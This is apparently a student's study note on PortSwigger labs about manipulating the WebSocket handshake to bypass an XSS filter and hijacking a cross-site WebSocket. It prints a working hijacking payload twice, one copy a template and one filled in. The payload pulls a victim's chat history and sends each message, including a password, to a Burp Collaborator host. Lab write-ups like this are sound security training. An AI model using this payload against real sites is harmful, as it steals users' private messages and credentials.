---
title: Manipulating WebSocket Handshake
author: Jon Marien
created: 2026-01-19
published: 2026-01-19
tags:
  - bscp
---

| Author     | Created          | Published        |
| ---------- | ---------------- | ---------------- |
| Jon Marien | January 19, 2026 | January 19, 2026 |

# Manipulating WebSocket Handshake
Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake. These vulnerabilities tend to involve design flaws, such as:

- Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

---
## Lab
This online shop has a live chat feature implemented using WebSockets.
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

![[image-1099.png]]

![[image-1100.png]]
![[image-1101.png]]
It got blocked:
![[image-1102.png]]
Now we're banned:
![[image-1103.png]]

So we must add a Header to circumvent this:
![[image-1104.png]]
Using a script that "obfuscates" the script, it might bypass the checker logic:
![[image-1106.png]]

And yup!
![[image-1107.png]]

---

# Collaborator Lab

In this lab, Collaborator is just your "listener"/exfil server.  
The flow is:

1. Victim’s browser opens a WebSocket to `/chat` using their session.
2. Your injected JS sends `READY` over that WebSocket.
3. The chat server responds with the victim’s chat messages, one per WebSocket frame.
4. Your JS, on each message, sends the data to a URL you control.
5. That URL is a Burp Collaborator payload, so you can read the captured messages from inside Burp. [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

So Collaborator is not involved in the WebSocket itself. It’s only used by your payload as a sink for the stolen data.

***
### 1. Get the WebSocket URL

- In the lab, click “Live chat”, send a message, reload once. [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
- In Burp, go to HTTP history, find the request that upgrades to WebSocket (`GET /chat HTTP/1.1` with `Upgrade: websocket`). [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
- Right‑click → “Copy URL”. You’ll get something like:  
  `https://YOUR-LAB-ID.web-security-academy.net/chat` [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

For WebSocket in JS, you must convert this to `wss://.../chat`. [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

***

### 2. Generate a Collaborator payload

- In Burp, go to the Collaborator tab.
- Click “Copy to clipboard” (or “New payload” then copy). [portswigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator/getting-started)
- You’ll get something like:  
  `https://abcdefg.oastify.com`

This is the URL your payload will `fetch()` to; each request body will contain one chat message.

***

### 3. Build the exploit HTML/JS (with Collaborator wired in)

In the exploit server’s “Body” field, you want something conceptually like this (structure only, not copy‑paste from source):

```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    ws.onopen = function() {
        ws.send('READY');   // ask server to send chat history
    };

    ws.onmessage = function(event) {
        // event.data is each chat message (JSON)
        fetch('https://YOUR-COLLABORATOR-PAYLOAD', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

Where: [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
- Replace `YOUR-LAB-ID...` with the URL you copied, but change `https` → `wss`.  
- Replace `https://YOUR-COLLABORATOR-PAYLOAD` with the exact Collaborator URL you copied. [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

That’s it: Collaborator is used exactly once here as the `fetch` target.

***

### 4. Deliver and confirm via Collaborator

- In the exploit server: click “Store”, then “Deliver exploit to victim”. [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
- Wait a few seconds for the victim simulation to hit your exploit.
- In Burp, go to the Collaborator tab → “Poll now”. [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
- You should see multiple HTTP interactions. Each request body is the JSON of a chat message (including the password message the lab wants you to steal). [portswigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

The lab is solved when the victim’s chat history has been exfiltrated via Collaborator.

***

![](../../../../../Resources/Manipulating%20WebSocket%20Handshake-1770502430002.webp)

exploit body:
```html
<script>
    var ws = new WebSocket('wss://0acf00a8044a05b68157395c005e004f.web-security-academy.net/chat');

    ws.onopen = function() {
        ws.send('READY');   // ask server to send chat history
    };

    ws.onmessage = function(event) {
        // event.data is each chat message (JSON)
        fetch('https://1aclb1grzatir5myok43itvn3e95xwll.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

wss link is the chat websocket link.
https link is the collaborator payload link.

We can see the results here:
![](../../../../../Resources/Manipulating%20WebSocket%20Handshake-1770502474428.webp)

![](../../../../../Resources/Manipulating%20WebSocket%20Handshake-1770503119743.webp)
![](../../../../../Resources/Manipulating%20WebSocket%20Handshake-1770503128982.webp)
![](../../../../../Resources/Manipulating%20WebSocket%20Handshake-1770503138480.webp)
![](../../../../../Resources/Manipulating%20WebSocket%20Handshake-1770503149546.webp)

And we can see the password! Let's try logging in:
![](../../../../../Resources/Manipulating%20WebSocket%20Handshake-1770503174179.webp)

Woohoo!!
